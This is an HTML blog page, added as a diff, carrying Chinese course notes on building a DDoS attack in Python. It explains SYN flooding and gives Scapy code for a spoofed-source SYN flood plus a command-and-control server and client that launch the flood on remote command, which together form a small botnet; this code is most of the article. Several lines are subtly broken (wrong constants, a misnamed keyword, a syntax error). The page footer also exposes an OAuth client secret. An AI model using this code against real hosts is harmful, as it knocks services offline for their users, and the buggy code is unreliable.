@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/deer-icon.png">
+  <link rel="icon" type="image/png" href="/img/deer-icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#87847e">
+  <meta name="description" content="">
+  <meta name="author" content="Skyla Sun">
+  <meta name="keywords" content="">
+  <title>实验楼-信息安全课程 - DeepDeer</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>深鹿计划</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/fav.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+                实验楼-信息安全课程
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-07-01 20:57">
+      2020年7月1日 晚上
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <p>本文中大部分相关知识及代码均来自<a href="https://www.shiyanlou.com/" target="_blank" rel="noopener">实验楼</a>。</p>
+<h2 id="第一课-Python实现DDoS攻击"><a href="#第一课-Python实现DDoS攻击" class="headerlink" title="第一课. Python实现DDoS攻击"></a>第一课. Python实现DDoS攻击</h2><p><strong>关键词</strong>：SYN泛洪，Scapy，argparse模块，socket模块</p>
+<h3 id="一-基础知识"><a href="#一-基础知识" class="headerlink" title="一. 基础知识"></a>一. 基础知识</h3><p><strong>SYN泛洪攻击</strong>，一种常见的DoS方式。通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽（CPU满负荷或内存不足）。具体来讲，在TCP三次握手过程中，客户端向服务器发送SYN报文后，不再响应服务器的回应报文。而服务器会在协议栈留出缓冲区存储握手过程，大量的连接请求都挂起在半连接状态。</p>
+<div align="center">
+  <img src="/2020/07/01/syl-sec/syn.jpg" srcset="/img/loading.gif" width="40%" height="40%" alt="oauth">
+</div>
+
+<p><strong>Scapy3K</strong>，即Scapy的Python3版本。Scapy是一个交互式数据包处理程序，可以发送、嗅探、解析和伪造网络数据包。它可以作为一个独立程序，也可以作为Python的第三方库使用。Scapy构造一个数据包非常简单，如下可构造一个SYN数据包。我们将IP包和TCP包组合在一起，形成一个完整的TCP数据包，其中，flags值为S说明要发送SYN数据包。</p>
+<pre><code class="hljs python">pkt = IP(src=<span class="hljs-string">'202.121.0.12'</span>, dst=<span class="hljs-string">'192.168.0.100'</span>)/TCP(dport=<span class="hljs-number">80</span>,flags=<span class="hljs-string">"S"</span>)
+send(pkt)</code></pre>
+
+<pre><code class="hljs python"><span class="hljs-comment">#SCAPY DOS脚本</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> random
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">synFlood</span><span class="hljs-params">(tgt, dPort)</span>:</span>
+  srcList = [<span class="hljs-string">'201.1.1.2'</span>,<span class="hljs-string">'10.1.1.102'</span>,<span class="hljs-string">'69.1.1.2'</span>,<span class="hljs-string">'125.130.5.199'</span>] <span class="hljs-comment">#伪造源地址</span>
+  <span class="hljs-keyword">for</span> sPort <span class="hljs-keyword">in</span> range(<span class="hljs-number">1024</span>,<span class="hljs-number">65535</span>): <span class="hljs-comment">#随机源端口</span>
+    index = random.randrange(<span class="hljs-number">4</span>)  <span class="hljs-comment">#随机选取源地址</span>
+    ipLayer = IP(src=srcList[index], dst=tgt)
+    tcpLayer = TCP(sport=sPort, dport=dPort,flag=<span class="hljs-string">"S"</span>)
+    packet = ipLayer / tcpLayer
+    send(packet)</code></pre>
+
+<p><strong>argparse命令解析库</strong>，实现程序命令行参数解析。例如，我们规定好Server端控制Client端的命令格式。</p>
+<p><code># -H xxx.xxx.xxx.xxx -p xxxx -c &lt;start|stop&gt;</code></p>
+<p>如下所示，我们创建一个ArgumentParser对象，使用description添加描述信息，使用add_argument添加我们想要解析的参数，其中的dest是通过parse_arg()函数返回的对象中的一个属性的名称，help选项是为了自动生成帮助信息。argparse常用参数<a href="https://docs.python.org/zh-cn/dev/library/argparse.html" target="_blank" rel="noopener">在这里</a>，包括default，required等。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse
+parser = argparse.ArgumentParser(description=<span class="hljs-string">'Process some integers'</span>)
+parser.add_argument(<span class="hljs-string">'-p'</span>, dest=<span class="hljs-string">'port'</span>,type=int, help=<span class="hljs-string">'An port number'</span>)
+parser.add_argument(<span class="hljs-string">'-H'</span>, dest=<span class="hljs-string">'host'</span>,type=str, help=<span class="hljs-string">'Ip address of client'</span>)
+parser.add_argument(<span class="hljs-string">'-c'</span>, dest=<span class="hljs-string">'cmd'</span>,type=str)</code></pre>
+
+<p><strong>socket模块</strong>，非常方便地实现网络中的信息交换，一般需要指定IP地址，协议类型，端口号即可。如下为客户端和服务器端的代码示例。</p>
+<pre><code class="hljs python"><span class="hljs-comment"># Client</span>
+<span class="hljs-keyword">import</span> socket
+s = socket.socket(socket.AF_INT, socket.SOCK_STREAM) <span class="hljs-comment">#AF_INT-&gt;IPV4协议，STREAM-&gt;基于流的TCP协议</span>
+s.connect((<span class="hljs-string">'192.168.0.100'</span>,<span class="hljs-number">7786</span>))</code></pre>
+
+<p>服务器端绑定一个地址和端口，0.0.0.0表示绑定所有网络地址。开始监听端口后，设定最大连接数为10，最后循环等待新连接，并将已连接的sock对象添加到列表中。accept（）默认是阻塞的，还可以通过settimeout（）设定等待时间或者setblocking（）设定为非阻塞模式。</p>
+<pre><code class="hljs python"><span class="hljs-comment">#Server</span>
+<span class="hljs-keyword">import</span> socket
+cliList = []
+s = socket.socket(socket.AF_INT, socket.SOCK_STREAM)
+s.bind((<span class="hljs-string">'0.0.0.0'</span>,<span class="hljs-number">7786</span>))
+s.listen(<span class="hljs-number">10</span>)
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    sock, addr = s.accept()
+    cliList.append(sock)</code></pre>
+
+<h3 id="二-具体实现"><a href="#二-具体实现" class="headerlink" title="二. 具体实现"></a>二. 具体实现</h3><p>首先在server端需要实现：1）接收客户端连接；2）向客户端发送命令的功能。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> argparse
+<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread
+
+socketList = []
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendCmd</span><span class="hljs-params">(cmd)</span>:</span>
+    print(<span class="hljs-string">'send command...'</span>)
+    <span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> socketList:
+        sock.send(cmd.encode(<span class="hljs-string">'utf-8'</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waitConnect</span><span class="hljs-params">(s)</span>:</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        sock, addr = s.accept()
+        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> socketList:
+            socketList.append(sock)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((<span class="hljs-string">'0.0.0.0'</span>,<span class="hljs-number">58868</span>))
+    s.listen(<span class="hljs-number">1024</span>)
+    t = Thread(target=waitConnect, args=(s,)) <span class="hljs-comment">#开新线程等待客户端连接，以免阻塞输入命令</span>
+    t.start()
+    <span class="hljs-comment">#等待客户端连入</span>
+  	print(<span class="hljs-string">'Wait for a clinet to connect'</span>)
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> len(socketList):
+        <span class="hljs-keyword">pass</span>
+    print(<span class="hljs-string">'A client connected!'</span>)
+    <span class="hljs-comment">#等待用户输入命令,并发送至客户端</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        print(<span class="hljs-string">'='</span>*<span class="hljs-number">50</span>)
+        print(<span class="hljs-string">'The command format # -H xxx.xxx.xxx.xxx -p xxxx -c &lt;start|stop&gt;'</span>)
+        cmd_str = input(<span class="hljs-string">'Please input cmd'</span>)
+        <span class="hljs-keyword">if</span> len(cmd_str):
+            <span class="hljs-keyword">if</span> cmd_str[<span class="hljs-number">0</span>] == <span class="hljs-string">'#'</span>:
+                sendCmd(cmd_str)
+ 
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    main()</code></pre>
+
+<p>在Client需要实现：1）主动连接server端；2）接收server命令后发起攻击。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> argparse
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+
+curProcess = <span class="hljs-literal">None</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">synFlood</span><span class="hljs-params">(tgt, dPort)</span>:</span>
+    srcList = [<span class="hljs-string">'201.1.1.2'</span>,<span class="hljs-string">'10.1.1.102'</span>,<span class="hljs-string">'69.1.1.2'</span>,<span class="hljs-string">'125.130.5.199'</span>] <span class="hljs-comment">#伪造源地址</span>
+    <span class="hljs-keyword">for</span> sPort <span class="hljs-keyword">in</span> range(<span class="hljs-number">1024</span>,<span class="hljs-number">65535</span>): <span class="hljs-comment">#随机源端口</span>
+      index = random.randrange(<span class="hljs-number">4</span>)  <span class="hljs-comment">#随机选取源地址</span>
+      ipLayer = IP(src=srcList[index], dst=tgt)
+      tcpLayer = TCP(sport=sPort, dport=dPort,flag=<span class="hljs-string">"S"</span>)
+      packet = ipLayer / tcpLayer
+      send(packet)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmdHandle</span><span class="hljs-params">(sock,parser)</span>:</span>
+		<span class="hljs-keyword">global</span> curProcess  <span class="hljs-comment">#全局变量，判断当前是否有进程正在进行攻击</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        data = sock.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">'utf-8'</span>)
+        <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>:
+            print(<span class="hljs-string">'The data is empty'</span>)
+            <span class="hljs-keyword">return</span>
+        <span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>] == <span class="hljs-string">'#'</span>:
+            <span class="hljs-keyword">try</span>:
+               options = parser.parse_args(data[<span class="hljs-number">1</span>:].split()) <span class="hljs-comment">#这里学一下</span>
+               m_host = options.host
+               m_port = options.port
+               m_cmd = options.cmd <span class="hljs-comment">#判断是start还是stop</span>
+               <span class="hljs-keyword">if</span> m_cmd.lower() == <span class="hljs-string">'start'</span>:
+                    <span class="hljs-keyword">if</span> curProcess != <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> curProcess.is_alive(): <span class="hljs-comment">#重新发动攻击</span>
+                        curProcess.terminate()
+                        curProcess = <span class="hljs-literal">None</span>
+                        os.system(<span class="hljs-string">'clear'</span>)
+                    print(<span class="hljs-string">'The synFlood is start'</span>)
+                    p = Process(target=synFlood, args=(m_host,m_port))
+                    p.start()
+                    curProcess = p
+               <span class="hljs-keyword">elif</span> m_cmd.lower() == <span class="hljs-string">'stop'</span>:
+                    <span class="hljs-keyword">if</span> curProcess.is_alive():
+                        curProcess.terminate()
+                        os.system(<span class="hljs-string">'clear'</span>)
+            <span class="hljs-keyword">except</span>:
+                print(<span class="hljs-string">'Failed to perform the command'</span>)
+                         
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+    parser = argparse.ArgumentParser(description=<span class="hljs-string">'Process some integers'</span>)
+		parser.add_argument(<span class="hljs-string">'-p'</span>, dest=<span class="hljs-string">'port'</span>,type=int, help=<span class="hljs-string">'An port number'</span>)
+		parser.add_argument(<span class="hljs-string">'-H'</span>, dest=<span class="hljs-string">'host'</span>,type=str, help=<span class="hljs-string">'Ip address of client'</span>)
+		parser.add_argument(<span class="hljs-string">'-c'</span>, dest=<span class="hljs-string">'cmd'</span>,type=str)
+    
+    <span class="hljs-keyword">try</span>:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((<span class="hljs-string">'XXXXXX'</span>, <span class="hljs-number">58868</span>))
+        print(<span class="hljs-string">'To connected server success'</span>)
+        print(<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>)
+        cmdHandle(s,parse)
+    <span class="hljs-keyword">except</span>:
+        print(<span class="hljs-string">'The network connected failed'</span>)
+        print(<span class="hljs-string">'Plese restart the script'</span>)
+        sys.exit(<span class="hljs-number">0</span>)
+<span class="hljs-keyword">if</span> __name__ = <span class="hljs-string">'__main__'</span>:
+    main()</code></pre>
+
+
+
+
+
+
+
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">课程笔记</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/06/01/encry-dns/">
+                        <span class="hidden-mobile">加密DNS协议相关内容</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <div class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    function loadGitalk(){
+      addScript('https://cdn.staticfile.org/gitalk/1.6.2/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: '719893e76127bcc98b08',
+          clientSecret: 'ed167d3d935e2922b47f190e1f36b026bd823a2d',
+          repo: 'deepdeer.github.io',
+          owner: 'DeepDeer',
+          admin: 'DeepDeer',
+          id: location.pathname,
+          language: 'zh-CN',
+          perPage: 15,
+          pagerDirection: 'last',
+          createIssueManually: 'false',
+          distractionFreeMode: 'false'
+        });
+        gitalk.render('gitalk-container');
+      });
+    }
+    createObserver(loadGitalk, 'gitalk-container');
+  </script>
+
+
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
